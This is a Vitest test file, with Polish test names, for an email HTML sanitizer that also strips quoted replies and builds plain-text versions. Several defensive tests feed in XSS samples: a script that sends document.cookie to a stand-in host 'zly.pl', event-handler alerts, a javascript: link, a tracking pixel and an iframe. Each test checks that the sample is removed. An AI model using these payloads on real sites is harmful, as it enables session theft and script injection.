import { describe, expect, it } from "vitest";
import {
  hasVisibleContent,
  htmlToOutgoingText,
  sanitizeIncomingHtml,
  sanitizeOutgoingHtml,
  stripQuotedHtml
} from "@/lib/mail/html";

describe("sanitizeIncomingHtml — bezpieczeństwo", () => {
  it("usuwa skrypty razem z treścią", () => {
    const result = sanitizeIncomingHtml('<p>Oferta</p><script>fetch("https://zly.pl?c="+document.cookie)</script>');
    expect(result).toBe("<p>Oferta</p>");
    expect(result).not.toContain("fetch");
  });

  it("usuwa atrybuty zdarzeń", () => {
    const result = sanitizeIncomingHtml('<p onclick="alert(1)" onmouseover="alert(2)">Tekst</p>');
    expect(result).toBe("<p>Tekst</p>");
  });

  it("blokuje odnośniki javascript:", () => {
    const result = sanitizeIncomingHtml('<a href="javascript:alert(1)">kliknij</a>');
    expect(result).not.toContain("javascript:");
  });

  it("usuwa obrazki — także piksele śledzące otwarcie wiadomości", () => {
    const result = sanitizeIncomingHtml('<p>Cześć</p><img src="https://tracker.example/pixel.gif?id=123" width="1">');
    expect(result).toBe("<p>Cześć</p>");
    expect(result).not.toContain("tracker");
  });

  it("usuwa style, które mogłyby nadpisać wygląd panelu", () => {
    const result = sanitizeIncomingHtml("<style>body{display:none}</style><p>Treść</p>");
    expect(result).toBe("<p>Treść</p>");
  });

  it("usuwa ramki i osadzone obiekty", () => {
    const result = sanitizeIncomingHtml('<iframe src="https://zly.pl"></iframe><p>Treść</p>');
    expect(result).toBe("<p>Treść</p>");
  });

  it("zachowuje formatowanie tekstu i listy", () => {
    const html = "<p><b>Ważne</b> i <i>mniej ważne</i></p><ul><li>punkt</li></ul>";
    expect(sanitizeIncomingHtml(html)).toBe(html);
  });

  it("zabezpiecza odnośniki zewnętrzne", () => {
    const result = sanitizeIncomingHtml('<a href="https://przyklad.pl">strona</a>');
    expect(result).toContain('target="_blank"');
    expect(result).toContain("noopener");
    expect(result).toContain("noreferrer");
  });
});

describe("sanitizeOutgoingHtml", () => {
  it("przepuszcza formatowanie, na które pozwala edytor", () => {
    const html = "<p><b>Dzień dobry</b></p><ul><li>pozycja</li></ul>";
    expect(sanitizeOutgoingHtml(html)).toBe(html);
  });

  it("odcina znaczniki wklejone poza edytorem", () => {
    const result = sanitizeOutgoingHtml('<p>Tekst</p><script>alert(1)</script><img src="x">');
    expect(result).toBe("<p>Tekst</p>");
  });

  it("nie przepuszcza tabel ani nagłówków — edytor ich nie tworzy", () => {
    const result = sanitizeOutgoingHtml("<h1>Nagłówek</h1><table><tr><td>a</td></tr></table>");
    expect(result).not.toContain("<h1>");
    expect(result).not.toContain("<table>");
  });
});

describe("stripQuotedHtml", () => {
  it("odcina blok cytatu Gmaila", () => {
    const html = '<div>Moja odpowiedź</div><div class="gmail_quote"><blockquote>stare</blockquote></div>';
    expect(stripQuotedHtml(html)).toBe("<div>Moja odpowiedź</div>");
  });

  it("odcina cytat Outlooka", () => {
    const html = '<p>Odpowiedź</p><div id="divRplyFwdMsg">poprzednia wiadomość</div>';
    expect(stripQuotedHtml(html)).toBe("<p>Odpowiedź</p>");
  });

  it("zostawia wiadomość bez cytatu bez zmian", () => {
    const html = "<p>Sama treść</p>";
    expect(stripQuotedHtml(html)).toBe(html);
  });
});

describe("hasVisibleContent", () => {
  it("pusty edytor to brak treści", () => {
    expect(hasVisibleContent("<p><br></p>")).toBe(false);
    expect(hasVisibleContent("   ")).toBe(false);
  });

  it("tekst to treść", () => {
    expect(hasVisibleContent("<p>Dzień dobry</p>")).toBe(true);
  });
});

describe("htmlToOutgoingText", () => {
  it("buduje czytelną wersję tekstową z list i akapitów", () => {
    const text = htmlToOutgoingText("<p>Dzień dobry,</p><ul><li>pierwsze</li><li>drugie</li></ul>");
    expect(text).toContain("Dzień dobry,");
    expect(text).toContain("• pierwsze");
    expect(text).toContain("• drugie");
  });
});
